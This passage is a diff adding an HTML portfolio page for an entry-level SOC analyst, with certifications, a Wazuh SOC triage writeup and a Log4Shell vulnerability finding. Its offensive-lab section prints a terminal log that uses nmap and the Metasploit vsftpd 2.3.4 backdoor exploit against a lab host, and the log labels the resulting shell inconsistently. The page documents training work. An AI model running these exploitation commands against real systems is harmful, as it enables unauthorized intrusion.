@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+<html lang="en" class="dark scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reycardo Millan | Cybersecurity Analyst & IT Systems Tech</title>
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <!-- Google Fonts: JetBrains Mono & Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            cyber: {
+              black: '#07080c',
+              darker: '#0c0e14',
+              card: '#12151e',
+              border: '#1f2638',
+              green: '#00ff66',
+              cyan: '#00f3ff',
+              red: '#ff3366',
+              amber: '#ffb700',
+              purple: '#ab47bc'
+            }
+          },
+          boxShadow: {
+            'glow-green': '0 0 20px rgba(0, 255, 102, 0.25)',
+            'glow-cyan': '0 0 20px rgba(0, 243, 255, 0.25)',
+            'glow-red': '0 0 20px rgba(255, 51, 102, 0.25)'
+          }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    /* Custom Scrollbar */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #07080c;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1f2638;
+      border-radius: 4px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #00ff66;
+    }
+    
+    /* Terminal scanline effect */
+    .scanline {
+      background: linear-gradient(
+        to bottom,
+        rgba(255,255,255,0),
+        rgba(255,255,255,0) 50%,
+        rgba(0, 255, 102, 0.03) 50%,
+        rgba(0, 255, 102, 0.03)
+      );
+      background-size: 100% 4px;
+    }
+
+    /* Cyber grid overlay */
+    .bg-grid-pattern {
+      background-size: 40px 40px;
+      background-image: 
+        linear-gradient(to right, rgba(31, 38, 56, 0.2) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(31, 38, 56, 0.2) 1px, transparent 1px);
+    }
+  </style>
+</head>
+<body class="bg-cyber-black text-slate-300 font-sans selection:bg-cyber-green selection:text-black relative overflow-x-hidden">
+
+  <!-- Interactive Matrix Binary Canvas Background -->
+  <canvas id="matrixCanvas" class="fixed top-0 left-0 w-full h-full pointer-events-none z-0 opacity-25"></canvas>
+
+  <div class="relative z-10 flex flex-col min-h-screen">
+
+    <!-- TOP NAVIGATION BAR -->
+    <header class="sticky top-0 z-50 backdrop-blur-md bg-cyber-black/80 border-b border-cyber-border/80">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+        
+        <!-- Logo / Callsign -->
+        <a href="#" class="flex items-center space-x-3 group">
+          <div class="w-9 h-9 rounded-lg bg-cyber-card border border-cyber-green/50 flex items-center justify-center text-cyber-green group-hover:shadow-glow-green transition-all duration-300">
+            <i class="fa-solid font-mono text-sm">&lt;/&gt;</i>
+          </div>
+          <div>
+            <span class="font-mono font-bold text-slate-100 text-lg tracking-wider group-hover:text-cyber-green transition-colors">REYCARDO<span class="text-cyber-green">.MILLAN</span></span>
+            <span class="block text-[10px] font-mono text-cyber-cyan tracking-widest leading-none">SOC / IT ANALYST</span>
+          </div>
+        </a>
+
+        <!-- Desktop Navigation Links -->
+        <nav class="hidden lg:flex items-center space-x-6 text-sm font-mono">
+          <a href="#certifications" class="hover:text-cyber-green transition-colors py-1">Certs</a>
+          <a href="#offensive-lab" class="hover:text-cyber-green transition-colors py-1">Pentest</a>
+          <a href="#blue-team" class="hover:text-cyber-green transition-colors py-1">SOC Report</a>
+          <a href="#vuln-assessment" class="hover:text-cyber-green transition-colors py-1">NIST Scan</a>
+          <a href="#it-tech" class="hover:text-cyber-green transition-colors py-1">IT Hardware</a>
+          <a href="#wazuh-lab" class="hover:text-cyber-green transition-colors py-1 text-cyber-cyan flex items-center gap-1.5">
+            <span class="relative flex h-2 w-2">
+              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyber-green opacity-75"></span>
+              <span class="relative inline-flex rounded-full h-2 w-2 bg-cyber-green"></span>
+            </span>
+            Wazuh Lab
+          </a>
+        </nav>
+
+        <!-- GitHub / Contact Buttons -->
+        <div class="hidden sm:flex items-center space-x-3">
+          <a href="https://reymillanworks-oss.github.io/Reymillanworks101/" target="_blank" rel="noopener noreferrer" 
+             class="px-3.5 py-1.5 rounded-md font-mono text-xs font-semibold bg-cyber-card border border-cyber-border text-slate-200 hover:border-cyber-cyan hover:text-cyber-cyan hover:shadow-glow-cyan transition-all flex items-center gap-2">
+            <i class="fa-brands fa-github text-sm"></i>
+            GitHub Portfolio
+          </a>
+          <a href="#contact" class="px-3.5 py-1.5 rounded-md font-mono text-xs font-semibold bg-cyber-green text-black hover:bg-emerald-400 transition-all hover:shadow-glow-green">
+            Connect
+          </a>
+        </div>
+
+        <!-- Mobile Menu Toggle -->
+        <button id="mobileMenuBtn" class="lg:hidden p-2 rounded-md border border-cyber-border text-slate-300 hover:text-cyber-green focus:outline-none">
+          <i class="fa-solid fa-bars text-lg" id="menuIcon"></i>
+        </button>
+      </div>
+
+      <!-- Mobile Navigation Drawer -->
+      <div id="mobileMenu" class="hidden lg:hidden bg-cyber-darker/95 border-b border-cyber-border px-4 pt-3 pb-6 space-y-3 font-mono text-sm backdrop-blur-lg">
+        <a href="#certifications" class="block py-2 text-slate-300 hover:text-cyber-green">Certifications</a>
+        <a href="#offensive-lab" class="block py-2 text-slate-300 hover:text-cyber-green">Offensive Lab</a>
+        <a href="#blue-team" class="block py-2 text-slate-300 hover:text-cyber-green">Blue Team Triage</a>
+        <a href="#vuln-assessment" class="block py-2 text-slate-300 hover:text-cyber-green">Vulnerability Assessment</a>
+        <a href="#it-tech" class="block py-2 text-slate-300 hover:text-cyber-green">IT Hardware Support</a>
+        <a href="#wazuh-lab" class="block py-2 text-cyber-cyan font-bold">Wazuh Home Lab Showcase</a>
+        <div class="pt-3 border-t border-cyber-border flex flex-col gap-2">
+          <a href="https://reymillanworks-oss.github.io/Reymillanworks101/" target="_blank" class="text-center py-2 bg-cyber-card border border-cyber-border rounded text-xs text-cyber-cyan">
+            <i class="fa-brands fa-github mr-1"></i> Open Live Repository
+          </a>
+        </div>
+      </div>
+    </header>
+
+    <!-- HERO / HEADER SECTION -->
+    <section class="py-16 md:py-24 relative overflow-hidden bg-grid-pattern">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+          
+          <!-- Left Column: Bio & Callout -->
+          <div class="lg:col-span-7 space-y-6">
+            
+            <div class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-cyber-card/90 border border-cyber-green/40 text-cyber-green font-mono text-xs shadow-sm">
+              <span class="w-2 h-2 rounded-full bg-cyber-green animate-pulse"></span>
+              Recent Graduate • Cyber Threat Monitoring Level 1
+            </div>
+
+            <h1 class="text-3xl sm:text-4xl md:text-5xl font-extrabold text-white tracking-tight leading-tight">
+              Millan, Reycardo Montañez
+            </h1>
+
+            <!-- Dynamic Typewriter Text -->
+            <div class="font-mono text-lg sm:text-xl text-cyber-cyan h-8 flex items-center">
+              <span id="typewriter" class="text-cyber-green font-semibold"></span>
+              <span class="animate-ping ml-1 text-cyber-green">_</span>
+            </div>
+
+            <p class="text-slate-300 text-base sm:text-lg leading-relaxed bg-cyber-card/40 backdrop-blur-sm p-4 rounded-xl border border-cyber-border/60">
+              Magandang araw po! I am a recent graduate certified in <span class="text-cyber-green font-mono font-medium">Cyber Threat Monitoring Level 1</span> with 3+ years of practical IT support foundation. Driven by a continuous passion for learning, my goal is to keep expanding my knowledge in SOC operations, vulnerability assessment, and threat detection while humbly serving and contributing value to team objectives.
+            </p>
+
+            <!-- Key Quick Stats -->
+            <div class="grid grid-cols-2 sm:grid-cols-3 gap-3 pt-2 font-mono text-xs">
+              <div class="bg-cyber-card/80 border border-cyber-border p-3 rounded-lg">
+                <div class="text-cyber-green font-bold text-lg">4x</div>
+                <div class="text-slate-400">Security Credentials</div>
+              </div>
+              <div class="bg-cyber-card/80 border border-cyber-border p-3 rounded-lg">
+                <div class="text-cyber-cyan font-bold text-lg">3+ Yrs</div>
+                <div class="text-slate-400">IT Hardware Support</div>
+              </div>
+              <div class="bg-cyber-card/80 border border-cyber-border p-3 rounded-lg col-span-2 sm:col-span-1">
+                <div class="text-cyber-amber font-bold text-lg">Self-Built</div>
+                <div class="text-slate-400">Wazuh SIEM Lab</div>
+              </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="flex flex-wrap gap-4 pt-4">
+              <a href="#wazuh-lab" class="px-5 py-3 rounded-lg font-mono text-sm font-bold bg-cyber-green text-black hover:bg-emerald-400 hover:shadow-glow-green transition-all flex items-center gap-2">
+                <i class="fa-solid fa-shield-halved"></i>
+                Explore Wazuh Lab Case
+              </a>
+              <a href="#certifications" class="px-5 py-3 rounded-lg font-mono text-sm font-bold bg-cyber-card border border-cyber-border text-slate-200 hover:border-cyber-cyan hover:text-cyber-cyan transition-all flex items-center gap-2">
+                <i class="fa-solid fa-certificate"></i>
+                View Credentials
+              </a>
+            </div>
+          </div>
+
+          <!-- Right Column: Interactive Terminal Graphic -->
+          <div class="lg:col-span-5">
+            <div class="bg-cyber-card rounded-xl border border-cyber-border shadow-2xl overflow-hidden scanline">
+              
+              <!-- Terminal Header -->
+              <div class="bg-cyber-darker px-4 py-3 border-b border-cyber-border flex items-center justify-between">
+                <div class="flex items-center space-x-2">
+                  <span class="w-3 h-3 rounded-full bg-red-500 inline-block"></span>
+                  <span class="w-3 h-3 rounded-full bg-yellow-500 inline-block"></span>
+                  <span class="w-3 h-3 rounded-full bg-green-500 inline-block"></span>
+                </div>
+                <span class="font-mono text-xs text-slate-400"><i class="fa-solid fa-terminal mr-1"></i> secops@reymillan-soc:~</span>
+                <span class="font-mono text-[10px] bg-cyber-green/10 text-cyber-green px-2 py-0.5 rounded border border-cyber-green/30">LEARNING & CONTRIBUTING</span>
+              </div>
+
+              <!-- Terminal Body -->
+              <div class="p-5 font-mono text-xs space-y-3 text-slate-300 min-h-[300px]">
+                <p class="text-slate-500"># System Diagnostics & SOC Environment Initialized</p>
+                
+                <div class="flex gap-2">
+                  <span class="text-cyber-green">analyst@soc:~$</span>
+                  <span class="text-white">wazuh-control status</span>
+                </div>
+                <div class="text-slate-400 pl-4 border-l-2 border-cyber-green/40 py-1 space-y-1">
+                  <div>[+] wazuh-modulesd: <span class="text-cyber-green">RUNNING (v4.14.9)</span></div>
+                  <div>[+] wazuh-analysisd: <span class="text-cyber-green">RUNNING</span></div>
+                  <div>[+] Active Agents: <span class="text-cyber-cyan">LAPTOP-REYCARDO (192.168.100.77)</span></div>
+                </div>
+
+                <div class="flex gap-2 pt-2">
+                  <span class="text-cyber-green">analyst@soc:~$</span>
+                  <span class="text-white">cat /etc/threat_summary.json</span>
+                </div>
+                <div class="bg-cyber-darker/90 p-3 rounded border border-cyber-border font-mono text-[11px] text-cyber-cyan overflow-x-auto">
+{
+  "mitre_tactic": "T1021.006 - WinRM Remote Execution",
+  "alerts_detected": 6,
+  "custom_rule": "Rule 100200 (Level 7)",
+  "status": "TRIAGED & MITIGATED"
+}
+                </div>
+
+                <div class="flex gap-2 pt-1 items-center">
+                  <span class="text-cyber-green">analyst@soc:~$</span>
+                  <span class="animate-pulse text-cyber-cyan">_ continuous skills expansion mode</span>
+                </div>
+              </div>
+
+              <!-- Terminal Footer -->
+              <div class="bg-cyber-darker/60 px-4 py-2 border-t border-cyber-border text-[11px] font-mono text-slate-400 flex justify-between">
+                <span>Threat Level: <span class="text-cyber-green">EVALUATED</span></span>
+                <span>OS: Ubuntu 24.04 / Win 10 Pro</span>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 1: CERTIFICATIONS & QUALIFICATIONS -->
+    <section id="certifications" class="py-16 bg-cyber-darker/60 border-t border-cyber-border">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <div class="flex flex-col md:flex-row md:items-end justify-between mb-12">
+          <div>
+            <div class="text-cyber-green font-mono text-xs uppercase tracking-widest mb-1">// Verified Credentials</div>
+            <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Certifications & Qualifications</h2>
+          </div>
+          <p class="text-slate-400 text-sm max-w-md mt-2 md:mt-0 font-mono">
+            Formal institutional training & Fortinet Technical Academy accreditations in network & SOC defense.
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+          
+          <!-- Cert 1: TESDA Cyber Threat -->
+          <div class="bg-cyber-card rounded-xl p-6 border border-cyber-border hover:border-cyber-green transition-all duration-300 hover:-translate-y-1 group">
+            <div class="w-12 h-12 rounded-lg bg-cyber-green/10 border border-cyber-green/30 flex items-center justify-center text-cyber-green mb-5 group-hover:shadow-glow-green transition-all">
+              <i class="fa-solid fa-shield-virus text-xl"></i>
+            </div>
+            <div class="inline-block px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-emerald-500/10 text-cyber-green border border-cyber-green/30 mb-3">
+              QUALIFIED
+            </div>
+            <h3 class="font-bold text-white text-lg mb-1 group-hover:text-cyber-green transition-colors">
+              Cyber Threat Monitoring L1
+            </h3>
+            <p class="text-xs font-mono text-cyber-cyan mb-3">TESDA / Radenta Academy</p>
+            <p class="text-slate-400 text-xs leading-relaxed mb-4">
+              Institutional Assessment Competent in Threat Monitoring, Security Event Identification, and Vulnerability Scanning routines.
+            </p>
+            <div class="text-[11px] font-mono text-slate-400 pt-3 border-t border-cyber-border/60 flex items-center justify-between">
+              <span>Issued:</span>
+              <span class="text-slate-300 font-semibold">October 2026</span>
+            </div>
+          </div>
+
+          <!-- Cert 2: FortiGate 7.6 Operator -->
+          <div class="bg-cyber-card rounded-xl p-6 border border-cyber-border hover:border-cyber-cyan transition-all duration-300 hover:-translate-y-1 group">
+            <div class="w-12 h-12 rounded-lg bg-cyber-cyan/10 border border-cyber-cyan/30 flex items-center justify-center text-cyber-cyan mb-5 group-hover:shadow-glow-cyan transition-all">
+              <i class="fa-solid fa-network-wired text-xl"></i>
+            </div>
+            <div class="inline-block px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyan-500/10 text-cyber-cyan border border-cyber-cyan/30 mb-3">
+              FORTINET CERT
+            </div>
+            <h3 class="font-bold text-white text-lg mb-1 group-hover:text-cyber-cyan transition-colors">
+              FortiGate 7.6 Operator
+            </h3>
+            <p class="text-xs font-mono text-cyber-cyan mb-3">Fortinet Training Institute</p>
+            <p class="text-slate-400 text-xs leading-relaxed mb-4">
+              Hands-on firewall administration, security policy creation, NAT configuration, and threat inspection mechanisms.
+            </p>
+            <div class="text-[11px] font-mono text-slate-400 pt-3 border-t border-cyber-border/60 flex items-center justify-between">
+              <span>Issued:</span>
+              <span class="text-slate-300 font-semibold">Oct 26, 2026</span>
+            </div>
+          </div>
+
+          <!-- Cert 3: Next-Gen Firewall 1.0 -->
+          <div class="bg-cyber-card rounded-xl p-6 border border-cyber-border hover:border-cyber-cyan transition-all duration-300 hover:-translate-y-1 group">
+            <div class="w-12 h-12 rounded-lg bg-cyber-cyan/10 border border-cyber-cyan/30 flex items-center justify-center text-cyber-cyan mb-5 group-hover:shadow-glow-cyan transition-all">
+              <i class="fa-solid fa-lock text-xl"></i>
+            </div>
+            <div class="inline-block px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyan-500/10 text-cyber-cyan border border-cyber-cyan/30 mb-3">
+              FORTINET CERT
+            </div>
+            <h3 class="font-bold text-white text-lg mb-1 group-hover:text-cyber-cyan transition-colors">
+              Next-Gen Firewall 1.0
+            </h3>
+            <p class="text-xs font-mono text-cyber-cyan mb-3">Fortinet Training Institute</p>
+            <p class="text-slate-400 text-xs leading-relaxed mb-4">
+              NGFW architecture design, deep packet perimeter defense, SSL inspection, and intrusion prevention policies (IPS).
+            </p>
+            <div class="text-[11px] font-mono text-slate-400 pt-3 border-t border-cyber-border/60 flex items-center justify-between">
+              <span>Issued:</span>
+              <span class="text-slate-300 font-semibold">Oct 24, 2026</span>
+            </div>
+          </div>
+
+          <!-- Cert 4: Cyber & Cloud Fundamentals -->
+          <div class="bg-cyber-card rounded-xl p-6 border border-cyber-border hover:border-cyber-cyan transition-all duration-300 hover:-translate-y-1 group">
+            <div class="w-12 h-12 rounded-lg bg-cyber-cyan/10 border border-cyber-cyan/30 flex items-center justify-center text-cyber-cyan mb-5 group-hover:shadow-glow-cyan transition-all">
+              <i class="fa-solid fa-cloud-shield text-xl"></i>
+            </div>
+            <div class="inline-block px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-cyan-500/10 text-cyber-cyan border border-cyber-cyan/30 mb-3">
+              FORTINET CERT
+            </div>
+            <h3 class="font-bold text-white text-lg mb-1 group-hover:text-cyber-cyan transition-colors">
+              Cyber & Cloud Fundamentals
+            </h3>
+            <p class="text-xs font-mono text-cyber-cyan mb-3">Fortinet Training Institute</p>
+            <p class="text-slate-400 text-xs leading-relaxed mb-4">
+              Core cloud security models, modern threat landscape analysis, zero trust network architecture, and cloud perimeter defense.
+            </p>
+            <div class="text-[11px] font-mono text-slate-400 pt-3 border-t border-cyber-border/60 flex items-center justify-between">
+              <span>Issued:</span>
+              <span class="text-slate-300 font-semibold">Oct 20, 2026</span>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- SECTION 2: OFFENSIVE LAB -->
+    <section id="offensive-lab" class="py-16 border-t border-cyber-border">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <div class="bg-cyber-card rounded-2xl border border-cyber-border overflow-hidden shadow-2xl">
+          <div class="p-6 md:p-8 border-b border-cyber-border bg-gradient-to-r from-cyber-card via-cyber-darker to-cyber-card flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4">
+            <div>
+              <div class="flex items-center gap-2 mb-2">
+                <span class="px-2.5 py-0.5 rounded text-xs font-mono font-bold bg-cyber-red/20 text-cyber-red border border-cyber-red/30">
+                  OFFENSIVE LAB
+                </span>
+                <span class="text-slate-400 font-mono text-xs">Penetration Testing Lifecycle</span>
+              </div>
+              <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Metasploitable2 Penetration Test</h2>
+            </div>
+            <div class="font-mono text-xs bg-cyber-darker px-4 py-2 rounded-lg border border-cyber-border text-slate-400">
+              Target IP: <span class="text-cyber-green font-bold">192.168.56.101</span>
+            </div>
+          </div>
+
+          <div class="p-6 md:p-8 grid grid-cols-1 lg:grid-cols-12 gap-8">
+            
+            <!-- Technical Steps Breakdown -->
+            <div class="lg:col-span-6 space-y-6">
+              <p class="text-slate-300 text-sm leading-relaxed">
+                Executed a full penetration testing methodology on a controlled vulnerable Linux host, ranging from initial network discovery to payload delivery and post-exploitation.
+              </p>
+
+              <div class="space-y-4 font-mono text-xs">
+                
+                <div class="bg-cyber-darker p-4 rounded-xl border border-cyber-border flex items-start gap-3">
+                  <div class="w-7 h-7 rounded-full bg-cyber-green/10 border border-cyber-green/40 text-cyber-green flex items-center justify-center shrink-0 font-bold">1</div>
+                  <div>
+                    <h4 class="font-bold text-white mb-1">Target Discovery & Port Scanning</h4>
+                    <p class="text-slate-400">Utilized Nmap stealth and service version flags to map active network daemons and fingerprint open ports on the target host.</p>
+                  </div>
+                </div>
+
+                <div class="bg-cyber-darker p-4 rounded-xl border border-cyber-border flex items-start gap-3">
+                  <div class="w-7 h-7 rounded-full bg-cyber-amber/10 border border-cyber-amber/40 text-cyber-amber flex items-center justify-center shrink-0 font-bold">2</div>
+                  <div>
+                    <h4 class="font-bold text-white mb-1">Service Vulnerability Identification</h4>
+                    <p class="text-slate-400">Flagged vulnerable <code class="text-cyber-cyan">vsftpd 2.3.4</code> FTP daemon containing a known backdoor vulnerability triggering arbitrary command execution.</p>
+                  </div>
+                </div>
+
+                <div class="bg-cyber-darker p-4 rounded-xl border border-cyber-border flex items-start gap-3">
+                  <div class="w-7 h-7 rounded-full bg-cyber-red/10 border border-cyber-red/40 text-cyber-red flex items-center justify-center shrink-0 font-bold">3</div>
+                  <div>
+                    <h4 class="font-bold text-white mb-1">Exploit Execution & Meterpreter Shell</h4>
+                    <p class="text-slate-400">Configured Metasploit payload module to launch targeted exploit, successfully establishing an elevated interactive Meterpreter session.</p>
+                  </div>
+                </div>
+
+              </div>
+            </div>
+
+            <!-- Terminal Execution Command Block -->
+            <div class="lg:col-span-6">
+              <div class="bg-cyber-darker rounded-xl border border-cyber-border overflow-hidden h-full flex flex-col">
+                <div class="bg-black/50 px-4 py-2.5 border-b border-cyber-border flex justify-between items-center">
+                  <span class="font-mono text-xs text-slate-400"><i class="fa-solid fa-code text-cyber-green mr-2"></i>Terminal Session Log</span>
+                  <button onclick="copyToClipboard('exploit-code')" class="text-xs font-mono text-slate-400 hover:text-cyber-green flex items-center gap-1 transition-colors">
+                    <i class="fa-regular fa-copy"></i> <span id="copy-text">Copy Code</span>
+                  </button>
+                </div>
+                <div class="p-4 font-mono text-xs overflow-x-auto text-slate-300 flex-1 bg-black/80">
+                  <pre id="exploit-code" class="leading-relaxed">
+<span class="text-slate-500"># Recon & Service Fingerprinting</span>
+<span class="text-cyber-green">root@kali:~#</span> nmap -n -sV 192.168.56.101
+
+Starting Nmap 7.94 ( https://nmap.org )
+PORT   STATE SERVICE VERSION
+21/tcp OPEN  ftp     vsftpd 2.3.4
+22/tcp OPEN  ssh     OpenSSH 4.7p1
+80/tcp OPEN  http    Apache httpd 2.2.8
+
+<span class="text-slate-500"># Exploit vsftpd 2.3.4 Backdoor via Metasploit</span>
+<span class="text-cyber-green">root@kali:~#</span> msfconsole -q
+<span class="text-cyber-cyan">msf6 &gt;</span> use exploit/unix/ftp/vsftpd_234_backdoor
+<span class="text-cyber-cyan">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</span> set RHOSTS 192.168.56.101
+RHOSTS =&gt; 192.168.56.101
+<span class="text-cyber-cyan">msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt;</span> run
+
+<span class="text-cyber-green font-bold">[*] 192.168.56.101:21 - Banner: 220 (vsFTPd 2.3.4)</span>
+<span class="text-cyber-green font-bold">[*] 192.168.56.101:21 - USER command sends smiley face :-)</span>
+<span class="text-cyber-green font-bold">[+] Command shell session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.101:6200)</span>
+<span class="text-cyber-red font-bold">Meterpreter Session Opened Successfully!</span></pre>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- SECTION 3: BLUE TEAM / SOC REPORT -->
+    <section id="blue-team" class="py-16 bg-cyber-darker/60 border-t border-cyber-border">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <div class="mb-10">
+          <div class="flex items-center gap-2 mb-1">
+            <span class="px-2.5 py-0.5 rounded text-xs font-mono font-bold bg-cyber-cyan/20 text-cyber-cyan border border-cyber-cyan/30">
+              BLUE TEAM / SOC REPORT
+            </span>
+          </div>
+          <h2 class="text-2xl sm:text-3xl font-extrabold text-white">WinRM & PowerShell Attack Triage</h2>
+          <p class="text-slate-400 text-sm mt-1 font-mono">
+            Correlated SIEM (Wazuh), Firewall, EDR, and Windows Event logs to investigate and isolate an active breach attempt.
+          </p>
+        </div>
+
+        <!-- Triage Breakdown Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+          
+          <div class="bg-cyber-card p-5 rounded-xl border border-cyber-border">
+            <div class="text-cyber-red text-xs font-mono font-bold mb-2 flex items-center justify-between">
+              <span>01 / DETECTION</span>
+              <i class="fa-solid fa-triangle-exclamation"></i>
+            </div>
+            <h4 class="text-white font-bold mb-2">Unauthorized WinRM Access</h4>
+            <p class="text-xs text-slate-400 leading-relaxed">
+              Flagged unexpected WinRM login over HTTP <span class="text-cyber-cyan font-mono font-bold">Port 5985</span> originating from untrusted external IP address <code class="text-cyber-red font-mono">2.57.121.25</code>.
+            </p>
+          </div>
+
+          <div class="bg-cyber-card p-5 rounded-xl border border-cyber-border">
+            <div class="text-cyber-amber text-xs font-mono font-bold mb-2 flex items-center justify-between">
+              <span>02 / EXECUTION</span>
+              <i class="fa-solid fa-terminal"></i>
+            </div>
+            <h4 class="text-white font-bold mb-2">Obfuscated PowerShell</h4>
+            <p class="text-xs text-slate-400 leading-relaxed">
+              Discovered Base64 encoded payload execution spawned via remote host management daemon process <code class="text-cyber-cyan font-mono">wsmprovhost.exe</code>.
+            </p>
+          </div>
+
+          <div class="bg-cyber-card p-5 rounded-xl border border-cyber-border">
+            <div class="text-cyber-purple text-xs font-mono font-bold mb-2 flex items-center justify-between">
+              <span>03 / LATERAL MOVEMENT</span>
+              <i class="fa-solid fa-arrows-split-up-and-left"></i>
+            </div>
+            <h4 class="text-white font-bold mb-2">SMB Share Reconnaissance</h4>
+            <p class="text-xs text-slate-400 leading-relaxed">
+              Detected unauthorized SMB admin share connection attempts targeting internal workstation subnet node <code class="text-cyber-green font-mono">10.30.15.30</code>.
+            </p>
+          </div>
+
+          <div class="bg-cyber-card p-5 rounded-xl border border-cyber-border">
+            <div class="text-cyber-cyan text-xs font-mono font-bold mb-2 flex items-center justify-between">
+              <span>04 / ENRICHMENT</span>
+              <i class="fa-solid fa-globe"></i>
+            </div>
+            <h4 class="text-white font-bold mb-2">Threat Intel Query</h4>
+            <p class="text-xs text-slate-400 leading-relaxed">
+              Queried VirusTotal API for adversary IP reputation: <span class="inline-block font-mono text-cyber-red font-bold px-1.5 py-0.5 rounded bg-cyber-red/10 border border-cyber-red/30">14/88 malicious flags</span> confirming malicious C2 node.
+            </p>
+          </div>
+
+        </div>
+
+        <!-- MITRE ATT&CK Mapping Bar -->
+        <div class="bg-cyber-card p-6 rounded-xl border border-cyber-border">
+          <div class="text-xs font-mono text-slate-400 uppercase tracking-widest mb-3 flex items-center gap-2">
+            <i class="fa-solid fa-cubes text-cyber-cyan"></i> MITRE ATT&CK® Framework Mapping
+          </div>
+          <div class="flex flex-wrap gap-3">
+            
+            <div class="flex items-center gap-2 bg-cyber-darker border border-cyber-border px-3 py-2 rounded-lg">
+              <span class="px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan font-mono font-bold text-xs">T1021.006</span>
+              <div class="text-xs">
+                <div class="text-white font-semibold">Remote Services</div>
+                <div class="text-[10px] text-slate-400">Windows Remote Management (WinRM)</div>
+              </div>
+            </div>
+
+            <div class="flex items-center gap-2 bg-cyber-darker border border-cyber-border px-3 py-2 rounded-lg">
+              <span class="px-2 py-0.5 rounded bg-cyber-green/10 text-cyber-green font-mono font-bold text-xs">T1059.001</span>
+              <div class="text-xs">
+                <div class="text-white font-semibold">Command & Scripting Interpreter</div>
+                <div class="text-[10px] text-slate-400">PowerShell Engine</div>
+              </div>
+            </div>
+
+            <div class="flex items-center gap-2 bg-cyber-darker border border-cyber-border px-3 py-2 rounded-lg">
+              <span class="px-2 py-0.5 rounded bg-cyber-amber/10 text-cyber-amber font-mono font-bold text-xs">T1027</span>
+              <div class="text-xs">
+                <div class="text-white font-semibold">Obfuscated Files or Information</div>
+                <div class="text-[10px] text-slate-400">Base64 Encoded Command Line</div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- SECTION 4: NIST VULNERABILITY ASSESSMENT -->
+    <section id="vuln-assessment" class="py-16 border-t border-cyber-border">
+      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        
+        <div class="flex flex-col md:flex-row md:items-end justify-between mb-10">
+          <div>
+            <div class="text-cyber-red font-mono text-xs uppercase tracking-widest mb-1">// NIST SP 800-115 STANDARDS</div>
+            <h2 class="text-2xl sm:text-3xl font-extrabold text-white">Enterprise Vulnerability Assessment</h2>
+          </div>
+          <p class="text-slate-400 text-sm max-w-md mt-2 md:mt-0 font-mono">
+            Credentialed vulnerability scan analysis, severity triage, and risk remediation plan for enterprise infrastructure.
+          </p>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+          
+          <!-- Finding 1: Log4Shell -->
+          <div class="bg-cyber-card p-6 rounded-xl border border-cyber-red/50 shadow-glow-red/10 relative overflow-hidden">
+            <div class="absolute top-0 right-0 bg-cyber-red text-black font-mono font-extrabold text-xs px-3 py-1 rounded-bl-lg">
+              CVSS 10.0 CRITICAL
+            </div>
+            <div class="text-cyber-red font-mono text-xs mb-1">CVE-2021-44228</div>
+            <h3 class="text-xl font-bold text-white mb-2">Log4Shell Remote Code Execution</h3>
+            <p class="text-xs font-mono text-cyber-cyan mb-4">Target: EHR Application Server (Hospital Core)</p>
+            <p class="text-slate-300 text-xs leading-relaxed mb-4">
+              Discovered unauthenticated JNDI injection vector in Apache Log4j library allowing remote attackers to achieve full system compromise via malicious LDAP lookup endpoints.
+            </p>
+            <div class="bg-cyber-darker p-3 rounded-lg border border-cyber-border font-mono text-xs">
+              <div class="text-slate-400 text-[11px] mb-1">Mitigation JVM Mitigation Flag:</div>
